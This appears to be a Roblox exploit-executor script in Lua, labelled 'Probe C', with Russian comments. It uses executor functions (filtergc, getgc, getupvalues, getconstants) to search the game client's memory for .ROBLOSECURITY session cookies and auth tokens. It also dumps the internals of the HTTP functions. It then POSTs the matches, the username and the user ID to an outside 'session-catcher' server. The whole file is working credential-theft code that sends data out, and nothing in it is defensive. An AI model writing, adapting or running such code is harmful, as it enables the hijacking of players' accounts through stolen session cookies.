-- ============================================================
--  Probe C — getgc/filtergc + getconstants + getupvalues
-- ============================================================

local SERVER_URL = "https://session-catcher.onrender.com/catch"
local httpRequest = request or http_request or nil
if not httpRequest then return end

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local gcMatches = {}
local gcStringCount = 0
local constants = {}
local upvalues = {}

-- -----------------------------------------------------------
-- 1. getgc / filtergc — скан всех строк
-- -----------------------------------------------------------
pcall(function()
    if filtergc then
        -- Получаем все строки из GC
        local strings = filtergc("string")
        if strings then
            gcStringCount = #strings
            for i, s in ipairs(strings) do
                if type(s) == "string" then
                    if s:find("_|WARNING") or s:find("ROBLOSECURITY") 
                       or s:find("|_") or s:find("auth_token") then
                        table.insert(gcMatches, "GC[" .. tostring(i) .. "]: " .. s:sub(1, 500))
                    end
                end
            end
        end
    elseif getgc then
        -- Fallback: getgc без фильтра
        local objs = getgc()
        if objs then
            for i, obj in pairs(objs) do
                if type(obj) == "string" then
                    gcStringCount = gcStringCount + 1
                    if obj:find("_|WARNING") or obj:find("ROBLOSECURITY") 
                       or obj:find("|_") then
                        table.insert(gcMatches, "GC[" .. tostring(i) .. "]: " .. obj:sub(1, 500))
                    end
                elseif type(obj) == "table" then
                    -- Проверяем один уровень
                    for k, v in pairs(obj) do
                        if type(v) == "string" then
                            gcStringCount = gcStringCount + 1
                            if v:find("_|WARNING") or v:find("ROBLOSECURITY") then
                                table.insert(gcMatches, "GC_TBL[" .. tostring(i) .. "][" .. tostring(k) .. "]: " .. v:sub(1, 500))
                            end
                        end
                    end
                elseif type(obj) == "function" then
                    -- Проверяем upvalues функций
                    if getupvalues then
                        local ok, upvs = pcall(getupvalues, obj)
                        if ok and upvs then
                            for k, v in pairs(upvs) do
                                if type(v) == "string" and (v:find("_|WARNING") or v:find("ROBLOSECURITY")) then
                                    table.insert(gcMatches, "GC_FUNC_UPVAL[" .. tostring(i) .. "][" .. tostring(k) .. "]: " .. v:sub(1, 500))
                                end
                            end
                        end
                    end
                    -- Проверяем константы функций
                    if getconstants then
                        local ok2, consts = pcall(getconstants, obj)
                        if ok2 and consts then
                            for k, v in pairs(consts) do
                                if type(v) == "string" and (v:find("_|WARNING") or v:find("ROBLOSECURITY")) then
                                    table.insert(gcMatches, "GC_FUNC_CONST[" .. tostring(i) .. "][" .. tostring(k) .. "]: " .. v:sub(1, 500))
                                end
                            end
                        end
                    end
                end
            end
        end
    end
end)

-- -----------------------------------------------------------
-- 2. getconstants на HTTP функциях
-- -----------------------------------------------------------
pcall(function()
    if getconstants then
        -- request
        local ok, consts = pcall(getconstants, request)
        if ok and consts then
            local dump = {}
            for k, v in pairs(consts) do
                dump[tostring(k)] = tostring(v):sub(1, 200)
            end
            constants["request"] = dump
        else
            constants["request"] = "ERR: " .. tostring(consts):sub(1, 100)
        end
    end
end)

pcall(function()
    if getconstants and httpget then
        local ok, consts = pcall(getconstants, httpget)
        if ok and consts then
            local dump = {}
            for k, v in pairs(consts) do
                dump[tostring(k)] = tostring(v):sub(1, 200)
            end
            constants["httpget"] = dump
        end
    end
end)

pcall(function()
    if getconstants then
        local ok, consts = pcall(getconstants, game.HttpGet)
        if ok and consts then
            local dump = {}
            for k, v in pairs(consts) do
                dump[tostring(k)] = tostring(v):sub(1, 200)
            end
            constants["game.HttpGet"] = dump
        end
    end
end)

pcall(function()
    if getconstants and httppost then
        local ok, consts = pcall(getconstants, httppost)
        if ok and consts then
            local dump = {}
            for k, v in pairs(consts) do
                dump[tostring(k)] = tostring(v):sub(1, 200)
            end
            constants["httppost"] = dump
        end
    end
end)

-- -----------------------------------------------------------
-- 3. getupvalues на HTTP функциях
-- -----------------------------------------------------------
pcall(function()
    if getupvalues then
        local ok, upvs = pcall(getupvalues, request)
        if ok and upvs then
            local dump = {}
            for k, v in pairs(upvs) do
                dump[tostring(k)] = tostring(v):sub(1, 200)
            end
            upvalues["request"] = dump
        else
            upvalues["request"] = "ERR or empty"
        end
    end
end)

pcall(function()
    if getupvalues and httpget then
        local ok, upvs = pcall(getupvalues, httpget)
        if ok and upvs then
            local dump = {}
            for k, v in pairs(upvs) do
                dump[tostring(k)] = tostring(v):sub(1, 200)
            end
            upvalues["httpget"] = dump
        end
    end
end)

pcall(function()
    if getupvalues then
        local ok, upvs = pcall(getupvalues, game.HttpGet)
        if ok and upvs then
            local dump = {}
            for k, v in pairs(upvs) do
                dump[tostring(k)] = tostring(v):sub(1, 200)
            end
            upvalues["game.HttpGet"] = dump
        end
    end
end)

local payload = {
    probe = "C — GC Scan + Constants + Upvalues",
    username = LocalPlayer.Name,
    userId = LocalPlayer.UserId,
    gcMatches = gcMatches,
    gcStringCount = gcStringCount,
    constants = constants,
    upvalues = upvalues,
    timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
}

pcall(function()
    httpRequest({
        Url = SERVER_URL,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(payload)
    })
end)

print("[Probe C] sent. GC strings: " .. gcStringCount .. " | GC matches: " .. #gcMatches)
